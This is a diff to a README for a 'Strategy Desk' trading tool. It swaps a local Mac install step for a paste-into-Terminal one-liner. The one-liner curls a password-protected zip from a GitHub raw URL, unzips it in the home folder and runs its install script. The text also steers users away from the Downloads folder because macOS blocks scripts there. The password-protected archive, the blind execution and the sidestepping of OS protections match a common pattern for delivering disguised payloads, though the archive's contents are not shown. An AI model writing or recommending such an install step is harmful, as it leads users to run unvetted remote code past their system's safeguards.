@@ -18,11 +18,15 @@ Your symbol, bar size, switches, and account numbers are saved in this browser. 
 
 You need Node.js 22 or newer.
 
-Windows: double-click `install-desk.bat`.
+Windows: unzip the archive and double-click `install-desk.bat`.
 
-Mac: do not double-click a script. macOS blocks that. Open **Terminal**, type `bash ` with a space after it, drag `install-desk.sh` into the Terminal window, and press Return. The file is in the project folder.
+Mac: do not double-click a script, and do not run it from Downloads. macOS blocks both. Open **Terminal**, paste this, and press Return. Type the archive password when `unzip` asks for it.
 
-Each launcher installs Node.js 22 or newer when it is missing, installs the desk packages, starts the desk, and opens `http://127.0.0.1:8080`. The file has to sit in the Strategy Desk folder, or in the `public` folder inside it.
+```bash
+cd "$HOME" && curl -fsSL -o strategy-desk.zip "https://github.com/JPFava/strategy-desk/raw/main/public/strategy-desk.zip" && unzip strategy-desk.zip && cd strategy-desk && bash install-desk.sh
+```
+
+The command downloads the desk into the home folder, where Terminal is allowed to run it. It installs Node.js 22 or newer when that is missing, installs the desk packages, starts the desk, and opens `http://127.0.0.1:8080`.
 
 Or run it yourself:
 
